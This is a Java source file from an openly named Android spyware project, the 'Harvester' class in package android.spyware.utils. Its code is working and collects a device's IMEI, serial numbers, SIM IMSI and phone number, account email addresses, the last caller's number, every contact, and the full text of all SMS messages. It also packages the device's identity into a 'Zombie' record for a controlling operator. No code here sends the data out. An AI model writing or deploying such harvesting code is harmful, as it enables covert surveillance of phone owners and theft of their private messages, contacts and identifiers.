package android.spyware.utils;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.spyware.model.Contact;
import android.spyware.model.SMS;
import android.spyware.model.Zombie;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class Harvester {
    private Context context;

    public Harvester(Context context) {
        this.context = context;
    }

    private Map<String, String> getDeviceInfo() {
        Map<String, String> deviceInfo = new HashMap<>();

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.READ_PHONE_STATE") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getDeviceInfo:insufficient permission");
        } else {
            TelephonyManager telephonyManager = (TelephonyManager) this.context.getSystemService(Context.TELEPHONY_SERVICE);

            deviceInfo.put("IMEI", telephonyManager.getDeviceId());
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("release", Build.VERSION.RELEASE);
            deviceInfo.put("serial", Build.SERIAL);
        }

        if (DEV_MODE) {
            Log.v(TAG, Harvester.class.getName() + "->getDeviceInfo:" + deviceInfo.toString());
        }

        return deviceInfo;
    }

    public List<String> getEmailAdresses() {
        List<String> emails = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.GET_ACCOUNTS") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getEmails:insufficient permission");
        } else {
            Pattern   pattern  = Patterns.EMAIL_ADDRESS;
            Account[] accounts = AccountManager.get(this.context).getAccounts();

            for (Account account : accounts) {
                if (pattern.matcher(account.name).matches()) { emails.add(account.name); }
            }
        }

        if (DEV_MODE) {
            Log.v(TAG, Harvester.class.getName() + "->getEmails:" + emails.toString());
        }

        return emails;
    }

    public String getLastCallerNumber() {
        String lastCallerNumber = null;

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.READ_CALL_LOG") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getLastCallerNumber:insufficient permission");
        } else {

            Uri URI = android.provider.CallLog.Calls.CONTENT_URI;
            String[] columns = {
                    android.provider.CallLog.Calls.NUMBER
            };
            String sort = android.provider.CallLog.Calls.DATE + " DESC";

            Cursor cursor = context.getContentResolver().query(
                    URI,
                    columns,
                    null,
                    null,
                    sort
            );

            if ((cursor != null) && (cursor.getCount() > 0)) {
                try {
                    cursor.moveToFirst();
                    lastCallerNumber = cursor.getString(0);
                } finally {
                    cursor.close();
                }
            }
        }

        if (DEV_MODE) {
            if (lastCallerNumber != null) {
                Log.v(TAG, Harvester.class.getName() + "->getLastCallerNumber:" + lastCallerNumber);
            } else { Log.v(TAG, Harvester.class.getName() + "->getLastCallerNumber:null"); }

        }

        return lastCallerNumber;
    }

    private Map<String, String> getSIMInfo() {
        Map<String, String> SIMInfo = new HashMap<>();

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.READ_PHONE_STATE") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getSIMInfo:insufficient permission");
        } else {
            TelephonyManager telephonyManager = (TelephonyManager) this.context.getSystemService(Context.TELEPHONY_SERVICE);

            SIMInfo.put("IMSI", telephonyManager.getSubscriberId());
            SIMInfo.put("MCC+MNC", telephonyManager.getSimOperator());
            SIMInfo.put("number", telephonyManager.getLine1Number());
            SIMInfo.put("serial", telephonyManager.getSimSerialNumber());
        }

        if (DEV_MODE) {
            Log.v(TAG, Harvester.class.getName() + "->getSIMInfo:" + SIMInfo.toString());
        }

        return SIMInfo;
    }

    public boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = ((ConnectivityManager) this.context.getSystemService(Context.CONNECTIVITY_SERVICE));
        NetworkInfo         networkInfo         = connectivityManager.getActiveNetworkInfo();
        Boolean             isConnected         = networkInfo != null && networkInfo.isConnected();

        if (DEV_MODE) {
            Log.v(TAG, Harvester.class.getName() + "->isNetworkConnected:" + Boolean.toString(isConnected));
        }

        return isConnected;
    }

    public List<Contact> getContacts() {
        List<Contact> contacts = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.READ_CONTACTS") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getContacts:insufficient permission");
        } else {
            Uri URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] columns = {
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone._ID,
                    ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER
            };
            String sort = "display_name ASC";

            Cursor cursor = this.context.getContentResolver().query(
                    URI,
                    columns,
                    null,
                    null,
                    sort
            );

            List<String> email_addresses = this.getEmailAdresses();

            if ((cursor != null) && (cursor.getCount() > 0)) {
                try {
                    cursor.moveToFirst();

                    do {
                        String display_name      = cursor.getString(0);
                        long   id                = cursor.getLong(1);
                        String normalized_number = cursor.getString(2);

                        contacts.add(new Contact(display_name, email_addresses, id, normalized_number));
                    } while (cursor.moveToNext());
                } finally {
                    cursor.close();
                }
            }
        }

        if (DEV_MODE) {
            Log.v(TAG, Harvester.class.getName() + "->getContacts:" + contacts.toString());
        }

        return contacts;
    }

    public List<SMS> getSMSArray() {
        List<SMS> SMSArray = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.READ_SMS") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getSMS:insufficient permission");
        } else {
            Uri URI = Telephony.Sms.CONTENT_URI;
            String[] columns = {
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms._ID,
                    Telephony.Sms.THREAD_ID,
                    Telephony.Sms.TYPE
            };
            String sort = "date DESC";

            Cursor cursor = this.context.getContentResolver().query(
                    URI,
                    columns,
                    null,
                    null,
                    sort
            );

            List<String> email_addresses = this.getEmailAdresses();

            if ((cursor != null) && (cursor.getCount() > 0)) {
                try {
                    cursor.moveToFirst();

                    do {
                        String address   = cursor.getString(0);
                        String body      = cursor.getString(1);
                        Date   date      = new Date(cursor.getLong(2));
                        long   id        = cursor.getLong(3);
                        long   thread_id = cursor.getLong(4);
                        int    type      = cursor.getInt(5);

                        SMSArray.add(new SMS(address, body, date, email_addresses, id, thread_id, type));
                    } while (cursor.moveToNext());
                } finally {
                    cursor.close();
                }
            }
        }

        if (DEV_MODE) {
            Log.v(TAG, Harvester.class.getName() + "->getSMS:" + SMSArray.toString());
        }

        return SMSArray;
    }

    public Zombie getZombie() {
        Zombie zombie = null;

        if (ContextCompat.checkSelfPermission(this.context, "android.permission.GET_ACCOUNTS") +
            ContextCompat.checkSelfPermission(this.context, "android.permission.READ_PHONE_STATE") != 0) {
            Log.wtf(TAG, Harvester.class.getName() + "->getZombie:insufficient permission");
        } else {
            List<String>        email_addresses = this.getEmailAdresses();
            Map<String, String> deviceInfo      = this.getDeviceInfo();
            Map<String, String> SIMInfo         = this.getSIMInfo();

            zombie = new Zombie(deviceInfo, email_addresses, SIMInfo);
        }

        if (DEV_MODE) {
            if (zombie != null) {
                Log.v(TAG, Harvester.class.getName() + "->getZombie:" + zombie.toString());
            } else { Log.v(TAG, Harvester.class.getName() + "->getZombie:null"); }
        }

        return zombie;
    }
}
